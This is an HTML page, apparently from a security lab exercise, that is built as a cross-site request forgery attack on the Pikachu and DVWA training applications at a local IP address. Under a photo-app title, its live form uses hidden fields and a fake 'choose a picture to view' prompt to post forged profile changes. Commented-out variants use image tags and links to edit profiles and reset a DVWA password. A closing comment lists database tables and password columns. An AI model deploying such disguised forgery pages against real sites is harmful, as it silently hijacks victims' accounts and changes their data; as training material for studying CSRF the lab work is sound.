<!DOCTYPE html>
<html lang="en">
	<head><title>美图秀秀</title><meta charset="utf-8"></head>
	<body>
		<!--<a href="http://192.168.1.136/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?
		sex=1234567&phonenum=123456&add=123456&email=123456&submit=submit"><img src="http://192.168.1.136/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?
		sex=1234567&phonenum=123456&add=123456&email=123456&submit=submit"></a>-->
		<!--<img src="http://192.168.1.136/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?
		sex=1234567&phonenum=123456&add=123456&email=123456&submit=submit">-->
		<!--<a href="http://192.168.1.136/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?
		sex=1234567&phonenum=1234567&add=1234567&email=1234567&submit=submit"><img src="http://192.168.1.136/pikachu-master/"></a>-->
		
		<!--<a href="http://192.168.1.136/dvwa-master/vulnerabilities/csrf/?password_new=12345678&password_conf=12345678&Change=Change">点击</a>
		
		<!--<form action="http://192.168.1.136/pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php" method="post">
			<input name="sex" value="123" type="hidden">
			<input class="phonenum" name="phonenum" value="123" type="hidden">
			<input class="add" name="add" value="123" type="hidden">
			<input class="emall" name="email" value="123" type="hidden">
			<input class="sub" type="submit" name="submit" value="点一下试试">
		</form>
		<h1>404 Not Find</h1>
	</body>-->
	<!--<a href="http://192.168.1.136/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=111&phonenum=222&add=333&email=444@qq.com&submit=submit">
	<img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Flmg.jj20.com%2Fup%2Fallimg%2F1114%2F010421142927%2F210104142927-8-1200.jpg&refer=http%3A%2F%2Flmg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1668663936&t=3b406dc5b640a9f818b2980a0174db63"></a>-->
	<script>
		if($_POST[submit]){
			alert('提交失败！');history.go(-1);
		}
	</script>
	<form method="post" action="http://192.168.1.136/pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php">
		<input type="hidden" name="sex" value="444">
		<input type="hidden" name="phonenum" value="333">
		<input type="hidden" name="add" value="222">
		<input type="hidden" name="email" value="111">
		<!--sex=111&phonenum=222&add=333&email=444%40qq.com&submit=submit-->
		选择要查看的图片：<input type="text"><input type="submit" name="submit">
	</form>
	1<img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Flmg.jj20.com%2Fup%2Fallimg%2F1114%2F010421142927%2F210104142927-8-1200.jpg&refer=http%3A%2F%2Flmg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1668663936&t=3b406dc5b640a9f818b2980a0174db63"
		width="100px";height="100px";>
	2<img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Flmg.jj20.com%2Fup%2Fallimg%2F1114%2F010421142927%2F210104142927-8-1200.jpg&refer=http%3A%2F%2Flmg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1668663936&t=3b406dc5b640a9f818b2980a0174db63"
		width="100px";height="100px";>
</html>
<!--httpinfo,member,message,users,xssblind
id,username,password,level-->